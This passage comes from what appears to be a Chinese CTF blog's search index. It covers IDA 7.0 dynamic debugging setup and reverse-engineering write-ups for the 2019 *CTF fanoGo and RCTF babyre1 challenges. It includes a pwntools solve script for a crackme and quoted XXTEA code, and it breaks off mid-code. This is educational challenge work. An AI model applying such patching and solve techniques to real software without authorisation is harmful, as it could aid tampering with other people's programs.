src="/p/reSkillsOn-Unpack-from-nsPack/image-20201216202815682.png"></p><h1 id="成功脱壳"><a href="#成功脱壳" class="headerlink" title="成功脱壳"></a>成功脱壳</h1><p>（这时候OD可以关闭了）此后按正常逆向流程走就可。</p>]]></content>
      
      
      <categories>
          
          <category> Skills </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> u5eful </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RE套路 - 关于使用IDA 7.0前端进行的动态调试</title>
      <link href="p/reSkillsOn-Debugging/"/>
      <url>p/reSkillsOn-Debugging/</url>
      
        <content type="html"><![CDATA[<p>整理一下<strong>IDA 7.0</strong>下几种常见文件类型的动态调试。</p><p>环境是win10+WSL2（WSL1调Linux文件一直有bug搞不定&#x3D; &#x3D;建议升2）。</p><a id="more"></a><p>P.S. 以下操作均在<strong>断点设置完毕</strong>以后进行，IDA动态调试开始时不会停在程序入口处，而会停在第一个断点或需要控制台进行相应操作处。</p><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><h3 id="选择debugger"><a href="#选择debugger" class="headerlink" title="选择debugger"></a>选择debugger</h3><p>在IDA中：Debugger -&gt; Select debugger -&gt; Local Windows debugger -&gt; OK</p><p><img src="/p/reSkillsOn-Debugging/image-20201215165123644.png"></p><p><img src="/p/reSkillsOn-Debugging/image-20201215165404966.png"></p><h3 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h3><p>按F9即可开始调试。</p><h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><h3 id="选择debugger-1"><a href="#选择debugger-1" class="headerlink" title="选择debugger"></a>选择debugger</h3><p>同Windows 64位操作。</p><h3 id="进行设置"><a href="#进行设置" class="headerlink" title="进行设置"></a>进行设置</h3><blockquote><p>IDA 7.2及高版本中win32位程序可不用进行如下配置就能进行动态调试。</p></blockquote><p>打开IDA目录下<code>./dbgsrv/win32_remote.exe</code></p><p><img src="/p/reSkillsOn-Debugging/image-20201215165819304.png"></p><p>图中所选的高亮部分即为ip地址，ip地址左侧<code>0.0.0.0:23946</code>处23946即为端口号。</p><p>在IDA中：Debugger -&gt; Process options，打开调试配置窗口。</p><p><img src="/p/reSkillsOn-Debugging/image-20201215170325772.png"></p><p><img src="/p/reSkillsOn-Debugging/image-20201215170051313.png"></p><p>将ip地址填入Hostname一栏，端口号填入Port一栏，其余为默认。</p><h3 id="开始调试-1"><a href="#开始调试-1" class="headerlink" title="开始调试"></a>开始调试</h3><p>同Windows 64位操作。</p><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h2><h3 id="选择debugger-2"><a href="#选择debugger-2" class="headerlink" title="选择debugger"></a>选择debugger</h3><p>在IDA中：Debugger -&gt; Select debugger -&gt; Remote Linux debugger -&gt; OK</p><p><img src="/p/reSkillsOn-Debugging/image-20201215170800417.png"></p><p><img src="/p/reSkillsOn-Debugging/image-20201215170814834.png"></p><h3 id="进行设置-1"><a href="#进行设置-1" class="headerlink" title="进行设置"></a>进行设置</h3><p>将IDA目录下<code>./dbgsrv/linux_server64</code>复制到需要调试的文件同目录下。</p><p><img src="/p/reSkillsOn-Debugging/image-20201215171149641.png"></p><p>打开WSL2并定位至该目录。</p><blockquote><p>第一次使用需给权限（偷懒直接给777），不然<code>./linux_server64</code>无法运行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 ./linux_server64</span><br></pre></td></tr></table></figure><p><img src="/p/reSkillsOn-Debugging/image-20201215171326819.png"></p></blockquote><p>运行<code>./linux_server64</code></p><p><img src="/p/reSkillsOn-Debugging/image-20201215171631806.png"></p><p>在IDA中：Debugger -&gt; Process options，打开调试配置窗口。</p><p><img src="/p/reSkillsOn-Debugging/image-20201215171706497.png"></p><p><img src="/p/reSkillsOn-Debugging/image-20201215171851733.png"></p><p>红框处将Application和Input file均改为<code>./文件名</code>（例如此处文件名为linux64，则改为<code>./linux64</code>）；Directory处清空（意思为当前目录）。</p><p>蓝框处Hostname一栏填<code>127.0.0.1</code>（代表本机），Port一栏填端口号（linux_server64处的23946）。</p><h3 id="开始调试-2"><a href="#开始调试-2" class="headerlink" title="开始调试"></a>开始调试</h3><p>同Windows 64位操作。</p><h2 id="32位-1"><a href="#32位-1" class="headerlink" title="32位"></a>32位</h2><p>其余操作均与Linux 64位同，除了要把所有的<code>./linux_server64</code>换成<code>./linux_server</code>。c10udlnk.top&#x2F;</p>]]></content>
      
      
      <categories>
          
          <category> Skills </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> u5eful </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>历年真题刷题小记</title>
      <link href="p/logFor-RealProbs-in-adworld-XCTF/"/>
      <url>p/logFor-RealProbs-in-adworld-XCTF/</url>
      
        <content type="html"><![CDATA[<p>是收录在攻防世界真题区的刷题记录，在网上找到的wp大多是各战队比赛时的简单思路，没有很具体的做法，所以想着写个刷题小记当伪wp，顺便也想趁机给自己总结和记录一下。</p><a id="more"></a><p>题目指路：<a href="https://adworld.xctf.org.cn/competition">https://adworld.xctf.org.cn/competition</a></p><p>刷题范围：2019年以来的比赛中&gt;&#x3D;20解的逆向题，循序渐进吧。</p><p>P.S. 起步tcl，会有参考其他wp的思路，什么时候没有参考wp了就说明我终于能单刷了（yep！</p><h1 id="2019-CTF-fanoGo"><a href="#2019-CTF-fanoGo" class="headerlink" title="[2019 *CTF] fanoGo"></a>[2019 *CTF] fanoGo</h1><blockquote><ul><li>2019 *CTF &#x2F; Reverse &#x2F; 28 solved</li><li>Completed：2020.12.08</li><li>参考wp：<ul><li><a href="https://github.com/sixstars/starctf2019/tree/master/re-fanoGo">starctf2019&#x2F;re-fanoGo at master · sixstars&#x2F;starctf2019</a></li><li><a href="https://www.anquanke.com/post/id/177490">*CTF 2019国际赛安胜ISEC WriteUp - 安全客，安全资讯平台</a></li><li><a href="https://xz.aliyun.com/t/5006">ROIS *CTF2019 Writeup - 先知社区</a></li></ul></li></ul></blockquote><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Do you kown go &amp; fano encode?</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nc 34.92.37.22 10001</span></span><br></pre></td></tr></table></figure><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><blockquote><p>相关工具&#x2F;插件：<a href="https://github.com/sibears/IDAGolangHelper">[IDA] IDAGolangHelper</a></p></blockquote><p>用了插件以后，主函数一般是main_main，所以找到主函数。</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20201209095047799.png"></p><p>然后看到一行<code>fano___Fano__Decode()</code></p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20201209095144599.png"></p><p>于是猜测是让我们输入数据，经过fanoDecode解码后等于该字符串（就是说输入数据&#x3D;该字符串的fano编码）。</p><p>（我摊牌，Go实在看不懂，这里参考wp的思路了。不过如果实在做不出来我可能也会这么猜（？</p><p>然后在函数栏搜索能看到，打包的时候把fanoEncode函数也装进来了，所以想到patch call直接复用。</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20201209095753661.png"></p><p>然后patch。</p><blockquote><p> 这里整理一下x86的call机器码格式（x64向下兼容：</p><ul><li><p>E8 xxxxxxxx</p><p>xxxxxxxx是偏移地址</p><p>偏移地址&#x3D;目标地址-当前地址-5（取完当前指令之后，pc先自增，程序再跳转；E8 xxxxxxxx有5字节</p></li><li><p>FF 15 [xxxxxxxx]</p><p>xxxxxxxx是绝对地址，FF15会对当前的这个绝对地址解*号，也就是绝对地址[目标地址]</p></li></ul></blockquote><p>原来的：</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20201209101939711.png"></p><p>先找到fanoEncode的地址：</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20201209102205135.png"></p><p>可以看到fanoEncode的地址为0x45C970。</p><p>然后计算偏移地址：</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20201209102347927.png"></p><p>patch（别忘了小端序）：</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20201209102138760.png"></p><p>patch完以后愉快地开始动态调试，配置完Debugger以后，为了看加密结果在fanoEncode函数的这里下断点。</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20201209102735769.png"></p><p>然后动态调试</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20201209104605432.png"></p><p>断点处打开Locals窗口（Debugger-&gt;Debugger windows-&gt;Locals）查看编码结果：</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20201209105058643.png"></p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20201209105119105.png"></p><p>v3这里是结果的地址，我们复制下来并在IDA view里按G跳转</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20201209105154151.png"></p><p>把这个数组dump下来就是要输入的数据。</p><p>最后的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># ------ Python2 ------</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">r=process(<span class="string">&quot;./fanoGo_ori&quot;</span>)</span><br><span class="line"></span><br><span class="line">arr=[<span class="number">0x2B</span>, <span class="number">0x60</span>, <span class="number">0xC3</span>, <span class="number">0xBE</span>, <span class="number">0xC2</span>, <span class="number">0xB7</span>, <span class="number">0xC2</span>, <span class="number">0x82</span>, <span class="number">0xC2</span>, <span class="number">0x89</span>, <span class="number">0xC3</span>, <span class="number">0x95</span>, <span class="number">0x5B</span>, <span class="number">0xC2</span>, <span class="number">0x87</span>, <span class="number">0x2A</span>, <span class="number">0x69</span>, <span class="number">0x13</span>, <span class="number">0xC2</span>, <span class="number">0x96</span>, <span class="number">0x51</span>, <span class="number">0xC3</span>, <span class="number">0xBD</span>, <span class="number">0x6F</span>, <span class="number">0x32</span>, <span class="number">0x28</span>, <span class="number">0x5A</span>, <span class="number">0xC3</span>, <span class="number">0x92</span>, <span class="number">0x74</span>, <span class="number">0xC2</span>, <span class="number">0x94</span>, <span class="number">0xC2</span>, <span class="number">0x94</span>, <span class="number">0xC2</span>, <span class="number">0x95</span>, <span class="number">0xC2</span>, <span class="number">0x96</span>, <span class="number">0xC2</span>, <span class="number">0xA4</span>, <span class="number">0xC3</span>, <span class="number">0x8A</span>, <span class="number">0xC2</span>, <span class="number">0xA3</span>, <span class="number">0xC3</span>, <span class="number">0x8E</span>, <span class="number">0xC2</span>, <span class="number">0xB3</span>, <span class="number">0x24</span>, <span class="number">0x24</span>, <span class="number">0x24</span>, <span class="number">0xC2</span>, <span class="number">0xBA</span>, <span class="number">0xC2</span>, <span class="number">0xAE</span>, <span class="number">0x46</span>, <span class="number">0x2B</span>, <span class="number">0xC2</span>, <span class="number">0xAC</span>, <span class="number">0x3C</span>, <span class="number">0xC3</span>, <span class="number">0xAB</span>, <span class="number">0x32</span>, <span class="number">0x23</span>, <span class="number">0x2A</span>, <span class="number">0xC3</span>, <span class="number">0xB0</span>, <span class="number">0xC3</span>, <span class="number">0xB3</span>, <span class="number">0xC2</span>, <span class="number">0xAC</span>, <span class="number">0xC3</span>, <span class="number">0x85</span>, <span class="number">0xC2</span>, <span class="number">0x87</span>, <span class="number">0x2C</span>, <span class="number">0xC2</span>, <span class="number">0xA3</span>, <span class="number">0x6B</span>, <span class="number">0xC2</span>, <span class="number">0xAD</span>, <span class="number">0x0F</span>, <span class="number">0xC3</span>, <span class="number">0x87</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xA8</span>, <span class="number">0xC3</span>, <span class="number">0xB3</span>, <span class="number">0xC2</span>, <span class="number">0xAF</span>, <span class="number">0xC3</span>, <span class="number">0xA1</span>, <span class="number">0xC3</span>, <span class="number">0xB9</span>, <span class="number">0x12</span>, <span class="number">0xC3</span>, <span class="number">0x8A</span>, <span class="number">0x44</span>, <span class="number">0x72</span>, <span class="number">0xC2</span>, <span class="number">0xA6</span>, <span class="number">0xC2</span>, <span class="number">0x91</span>, <span class="number">0x66</span>, <span class="number">0x6D</span>, <span class="number">0x31</span>, <span class="number">0xC3</span>, <span class="number">0xA7</span>, <span class="number">0x51</span>, <span class="number">0x64</span>, <span class="number">0x67</span>, <span class="number">0x78</span>, <span class="number">0x75</span>, <span class="number">0x6B</span>, <span class="number">0xC2</span>, <span class="number">0x96</span>, <span class="number">0xC2</span>, <span class="number">0x91</span>, <span class="number">0x51</span>, <span class="number">0xC3</span>, <span class="number">0xA7</span>, <span class="number">0x3E</span>, <span class="number">0x13</span>, <span class="number">0xC3</span>, <span class="number">0x8E</span>, <span class="number">0x57</span>, <span class="number">0x7B</span>, <span class="number">0x47</span>, <span class="number">0xC2</span>, <span class="number">0x9D</span>, <span class="number">0x45</span>, <span class="number">0x7F</span>, <span class="number">0x29</span>, <span class="number">0x11</span>, <span class="number">0xC3</span>, <span class="number">0x95</span>, <span class="number">0xC3</span>, <span class="number">0xA1</span>, <span class="number">0xC3</span>, <span class="number">0xA7</span>, <span class="number">0x59</span>, <span class="number">0xC2</span>, <span class="number">0x8A</span>, <span class="number">0x06</span>, <span class="number">0xC2</span>, <span class="number">0x8C</span>, <span class="number">0xC2</span>, <span class="number">0x91</span>, <span class="number">0xC2</span>, <span class="number">0xB5</span>, <span class="number">0x0F</span>, <span class="number">0x3A</span>, <span class="number">0xC2</span>, <span class="number">0x8E</span>, <span class="number">0xC2</span>, <span class="number">0xBA</span>, <span class="number">0xC3</span>, <span class="number">0x8B</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0xC3</span>, <span class="number">0xA8</span>, <span class="number">0xC3</span>, <span class="number">0xBC</span>, <span class="number">0xC2</span>, <span class="number">0x8E</span>, <span class="number">0x71</span>, <span class="number">0xC3</span>, <span class="number">0xBD</span>, <span class="number">0x6F</span>, <span class="number">0x32</span>, <span class="number">0x36</span>, <span class="number">0xC3</span>, <span class="number">0xB9</span>, <span class="number">0x42</span>, <span class="number">0xC3</span>, <span class="number">0xA7</span>, <span class="number">0x49</span>, <span class="number">0xC3</span>, <span class="number">0x92</span>, <span class="number">0x22</span>, <span class="number">0x79</span>, <span class="number">0xC3</span>, <span class="number">0x89</span>, <span class="number">0xC3</span>, <span class="number">0x93</span>, <span class="number">0x54</span>, <span class="number">0x79</span>, <span class="number">0xC3</span>, <span class="number">0x96</span>, <span class="number">0x63</span>, <span class="number">0x6A</span>, <span class="number">0x1F</span>, <span class="number">0xC3</span>, <span class="number">0x96</span>, <span class="number">0xC3</span>, <span class="number">0xB3</span>, <span class="number">0x23</span>, <span class="number">0x6F</span>, <span class="number">0xC2</span>, <span class="number">0x94</span>, <span class="number">0x37</span>, <span class="number">0xC2</span>, <span class="number">0x94</span>, <span class="number">0xC3</span>, <span class="number">0xA8</span>, <span class="number">0x76</span>, <span class="number">0xC3</span>, <span class="number">0x83</span>, <span class="number">0xC3</span>, <span class="number">0x8E</span>, <span class="number">0x7C</span>, <span class="number">0x3F</span>, <span class="number">0xC2</span>, <span class="number">0xAD</span>, <span class="number">0xC3</span>, <span class="number">0xA0</span>, <span class="number">0xC2</span>, <span class="number">0x9F</span>, <span class="number">0x0C</span>, <span class="number">0xC2</span>, <span class="number">0xAA</span>, <span class="number">0x7B</span>, <span class="number">0xC3</span>, <span class="number">0x83</span>, <span class="number">0x26</span>, <span class="number">0xC2</span>, <span class="number">0xAD</span>, <span class="number">0xC3</span>, <span class="number">0xB0</span>, <span class="number">0x7E</span>, <span class="number">0x3A</span>, <span class="number">0xC3</span>, <span class="number">0xA5</span>, <span class="number">0x47</span>, <span class="number">0xC2</span>, <span class="number">0x9D</span>, <span class="number">0x7F</span>, <span class="number">0x09</span>, <span class="number">0xC3</span>, <span class="number">0xA5</span>, <span class="number">0x49</span>, <span class="number">0x44</span>, <span class="number">0xC2</span>, <span class="number">0xB0</span>, <span class="number">0xC2</span>, <span class="number">0xAF</span>, <span class="number">0x0F</span>, <span class="number">0x3A</span>, <span class="number">0xC3</span>, <span class="number">0x8C</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0xC3</span>, <span class="number">0xBD</span>, <span class="number">0x6F</span>, <span class="number">0x32</span>, <span class="number">0x2C</span>, <span class="number">0xC3</span>, <span class="number">0x8C</span>, <span class="number">0x2D</span>, <span class="number">0x27</span>, <span class="number">0x49</span>, <span class="number">0xC3</span>, <span class="number">0xA3</span>, <span class="number">0x2A</span>, <span class="number">0xC3</span>, <span class="number">0xB0</span>, <span class="number">0xC3</span>, <span class="number">0xB3</span>, <span class="number">0xC2</span>, <span class="number">0xAC</span>, <span class="number">0xC3</span>, <span class="number">0x88</span>, <span class="number">0xC2</span>, <span class="number">0x89</span>, <span class="number">0xC3</span>, <span class="number">0xB0</span>, <span class="number">0xC2</span>, <span class="number">0x9D</span>, <span class="number">0x7E</span>, <span class="number">0x1C</span>, <span class="number">0xC2</span>, <span class="number">0x9F</span>, <span class="number">0x29</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x47</span>, <span class="number">0xC3</span>, <span class="number">0xB5</span>, <span class="number">0xC2</span>, <span class="number">0xBC</span>, <span class="number">0xC3</span>, <span class="number">0x88</span>, <span class="number">0xC2</span>, <span class="number">0x9A</span>, <span class="number">0x38</span>, <span class="number">0xC3</span>, <span class="number">0xB0</span>, <span class="number">0xC3</span>, <span class="number">0xA2</span>, <span class="number">0xC2</span>, <span class="number">0xB8</span>, <span class="number">0xC3</span>, <span class="number">0xA9</span>, <span class="number">0x15</span>, <span class="number">0xC3</span>, <span class="number">0x92</span>, <span class="number">0x50</span>, <span class="number">0x40</span>]</span><br><span class="line">payload=<span class="built_in">bytearray</span>(arr[:<span class="number">0x136</span>]) <span class="comment">#看fano_Str2Bytes可以发现结果的长度为0x136</span></span><br><span class="line">r.sendafter(<span class="string">&#x27;:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>因为要nc没拿到flag（</p><p>本地打通就好</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20201209105707639.png"></p><hr><h1 id="2019-RCTF-babyre1"><a href="#2019-RCTF-babyre1" class="headerlink" title="[2019 RCTF] babyre1"></a>[2019 RCTF] babyre1</h1><blockquote><ul><li>2019 RCTF &#x2F; Reverse &#x2F; 40 solved</li><li>Completed：2021.03.24</li><li>参考wp：<ul><li><a href="https://bbs.pediy.com/thread-253844.htm">[原创]微型加密算法实现及逆向分析-密码应用-看雪论坛</a>（查XXTEA的时候看到的</li></ul></li></ul></blockquote><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p>It’s just a baby…</p><p>There are multiple answers, please ensure MD5(rctf{your answer}) &#x3D;&#x3D; 5f8243a662cf71bf31d2b2602638dc1d</p><p>wrap your answer in rctf{}</p><h2 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h2><p>主函数这里逻辑比较明显，flag长度限定到16，puts(v6)很容易可以猜测是题目里说的输出<code>Bingo!</code>。</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210324155416714.png"></p><p><code>sub_C00()</code>函数点进去能看到：</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210324155639166.png"></p><p>而<code>sub_BE0()</code>实际上是取数组对应值，取ASCII码为48（<code>ord(&#39;0&#39;)</code>）到48+55-1&#x3D;102（<code>ord(&#39;f&#39;)</code>）在byte_1620数组里对应的值，稍加分析就可以知道<code>sub_C00()</code>是unhexlify的作用。</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210324155752866.png"></p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210324155805172.png"></p><p>然后为了方便后续分析，根据函数内容和参数给变量重命名。</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210326104321181.png"></p><p>接着往下走到<code>sub_1180()</code>，主要逻辑在<code>sub_CE0()</code>这里：</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210326103659136.png"></p><p>而<code>sub_CE0()</code>的整个大逻辑大概是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a2 &gt; <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* ...... */</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line">result = <span class="number">1L</span>L;</span><br><span class="line"><span class="keyword">if</span> ( a2 &lt; <span class="number">-1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* ...... */</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>也就是说通过调用<code>sub_CE0()</code>时的第二个参数a2来确定函数走哪一部分的流程。</p><p>而这个a2是可以算出来的，即<code>sub_1180()</code>的<code>-(v10 &gt;&gt; 2)</code>：</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210326110256398.png"></p><p>也就是说<code>v10=a2=8</code>（这里a2是<strong>上一层函数传进来的</strong>hexLen，输入被限制在16字符，故hexLen一定为8），所以<strong>传进去的</strong><code>a2=-(v10&gt;&gt;2)=-(8&gt;&gt;2)=-2</code>，直接走下面那层<code>a2 &lt; -1</code>的逻辑。</p><p>其实这个<code>sub_CE0()</code>函数长得不就像XXTEA的加密&#x2F;解密函数吗（长得这么别致的真的不多见&#x3D; &#x3D;。</p><blockquote><p>关于TEA系列加解密：<a href="https://blog.csdn.net/gsls200808/article/details/48243019">TEA、XTEA、XXTEA加密解密算法_gsls200808的专栏-CSDN博客</a></p></blockquote><p>在上面链接摘取一下XXTEA的实现代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">btea</span><span class="params">(<span class="keyword">uint32_t</span> *v, <span class="keyword">int</span> n, <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="keyword">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = rounds*DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v[<span class="number">2</span>]= &#123;<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> <span class="keyword">const</span> k[<span class="number">4</span>]= &#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> n= <span class="number">2</span>; <span class="comment">//n的绝对值表示v的长度，取正表示加密，取负表示解密</span></span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数</span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密前原始数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    btea(v, n, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    btea(v, -n, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显地，Decoding Part跟<code>sub_CE0()</code>的<code>a2&lt;-1</code>部分基本是一模一样的，也就是我们要走的这个流程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 